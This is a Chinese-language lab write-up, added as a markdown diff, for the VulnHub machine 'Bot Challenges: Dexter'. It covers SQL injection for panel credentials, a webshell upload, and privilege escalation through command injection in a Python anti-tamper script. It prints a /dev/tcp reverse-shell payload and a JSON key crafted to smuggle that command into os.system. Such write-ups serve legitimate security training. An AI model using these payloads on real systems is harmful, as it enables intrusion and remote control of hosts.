@@ -1,0 +1,148 @@
+---
+title: VulnHub Bot Challenges：Dexter
+date: 2026-04-01 16:17:00
+categories: 
+  - VulnHub
+tags:
+  - SQL 注入
+  - 文件上传
+  - Python 命令注入
+---
+
+# Bot Challenges: Dexter
+
+项目地址：https://download.vulnhub.com/botchallenges/MurderingDexter.zip
+
+是一个打包好的镜像文件
+
+**注意：导入 vmx 时一定要选择我已移动，否则没网**
+
+使用 Nmap 扫描出开放服务及操作系统版本
+
+![](https://pic1.imgdb.cn/item/698d925ac46878ce9faee432.png)
+
+开局一个登录框
+
+![](https://pic1.imgdb.cn/item/698d9398c46878ce9faee45c.png)
+
+## SQL 注入
+
+### Dexter (CasinoLoader) SQL Injection
+
+直接搜索 Nday
+
+![](https://pic1.imgdb.cn/item/698d9b85c46878ce9faee59f.png)
+
+拿到账号密码登录
+
+```
+loserbotter
+if i hadreal talent, i would make money legitimatelyany
+```
+
+## 文件上传
+
+### File Uploader
+
+登录后才能上传文件，直接传木马
+
+![](https://pic1.imgdb.cn/item/698d9d47c46878ce9faee5c5.png)
+
+在这个路径中找到上传的木马
+
+![](https://pic1.imgdb.cn/item/698d9f94c46878ce9faee618.png)
+
+## 提权
+
+### Python 命令注入
+
+连接上后发现有个 `antitamper.py` 文件
+
+![](https://pic1.imgdb.cn/item/698da05bc46878ce9faee623.png)
+
+脚本内容如下，验证指定文件的 MD5 哈希值是否匹配
+
+```python
+import os
+import json
+def check():
+    with open('/var/www/antitamper.list') as f:
+        content = json.loads(f.read())
+        for f in content:
+            s = "echo '%s  %s' | md5sum -c --status >> /var/www/tamper.log" % (content[f], f)
+            os.system(s)
+check()
+```
+
+从 JSON 文件中读取一个键值对，其中：
+
+- `f` 是键（key），表示文件路径
+- `content[f]` 是对应的值，表示该文件预期的 MD5 哈希值
+
+```python
+s = "echo '%s  %s' | md5sum -c --status >> /var/www/tamper.log" % (content[f], f)
+os.system(s)
+```
+
+`f`（文件路径）来自 JSON 文件，而该文件对运行 Web 服务的 `www-data` 用户是**可写**的
+
+这意味着攻击者可以**任意修改** JSON 文件的内容，从而控制 `f` 的值
+
+在生成命令时，`f` 直接被拼接到单引号包裹的位置
+
+由于没有进行任何转义，如果 `f` 中包含单引号、分号等特殊字符，就会**提前闭合掉原本的单引号**，随后插入攻击者想要的任意命令
+
+```shell
+echo 'd41d8cd98f00b204e9800998ecf8427e'; /bin/bash -c 'exec 5<>/dev/tcp/192.168.187.129/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'; echo '' | md5sum -c --status >> /var/www/tamper.log
+```
+
+这里的第一个 `'` 闭合了原代码中的左单引号
+
+Payload 末尾的 `echo '` 与原代码剩下的 `'` 结合，变成了 `echo ''`
+
+`cat <&5` 读取文件描述符 5 的内容（即从攻击者那里收到的命令），通过管道传给 `while` 循环，循环读取每一行并执行（`$line` 作为命令），同时将命令的输出（`stdout` 和 `stderr`）都重定向回文件描述符 5，即发送回攻击者的终端
+
+```bash
+cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+
+查看 `antitamper.list` 文件内容
+
+```
+{
+    "/var/www/Panel/info.php": "d8fa4356213b6ce9253f55acdff780ac",
+    "/var/www/Panel/upload.php" : "b2640cea86e5171662a082b6a043fcc2",
+    "/var/www/Panel/style.css": "92f234834a61b7fde898eea40f857bb3",
+    "/var/www/Panel/gateway.php": "7b93115195db0c0b085a1107c4cc1aed",
+    "/var/www/Panel/pagination.php": "1a8d91c12263dd5298a70c72976c5e97",
+    "/var/www/Panel/viewer.php": "292b3b12c2f90c0e557bf599c2475c15",
+    "/var/www/Panel/config.php": "421fc13061ab1f343e6607e4ef4f8f42",
+    "/var/www/Panel/main.php": "7812b7c1ed608299c9bece4f46607423",
+    "/var/www/Panel/load.php": "0f95762562aa97c62d004949e7337e95",
+    "/var/www/Panel/viewer_pagination.php": "60c7444a92daa115abfecc73c46fc2ec",
+    "/var/www/Panel/master.php": "2b50c51fce89ddcfb769effdeab7080c",
+    "/var/www/Panel/index.php": "af44aa507c02f3c1aede5e251b28dc64"
+}
+```
+
+在最后一行添加上反弹 Shell
+
+```
+{
+    "/var/www/Panel/info.php": "d8fa4356213b6ce9253f55acdff780ac",
+    "/var/www/Panel/upload.php" : "b2640cea86e5171662a082b6a043fcc2",
+    "/var/www/Panel/style.css": "92f234834a61b7fde898eea40f857bb3",
+    "/var/www/Panel/gateway.php": "7b93115195db0c0b085a1107c4cc1aed",
+    "/var/www/Panel/pagination.php": "1a8d91c12263dd5298a70c72976c5e97",
+    "/var/www/Panel/viewer.php": "292b3b12c2f90c0e557bf599c2475c15",
+    "/var/www/Panel/config.php": "421fc13061ab1f343e6607e4ef4f8f42",
+    "/var/www/Panel/main.php": "7812b7c1ed608299c9bece4f46607423",
+    "/var/www/Panel/load.php": "0f95762562aa97c62d004949e7337e95",
+    "/var/www/Panel/viewer_pagination.php": "60c7444a92daa115abfecc73c46fc2ec",
+    "/var/www/Panel/master.php": "2b50c51fce89ddcfb769effdeab7080c",
+    "/var/www/Panel/index.php": "af44aa507c02f3c1aede5e251b28dc64",
+    "'; /bin/bash -c 'exec 5<>/dev/tcp/192.168.187.129/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'; echo '": "d41d8cd98f00b204e9800998ecf8427e"	
+}
+```
+
+![](https://pic1.imgdb.cn/item/698da53cc46878ce9faee70f.png)
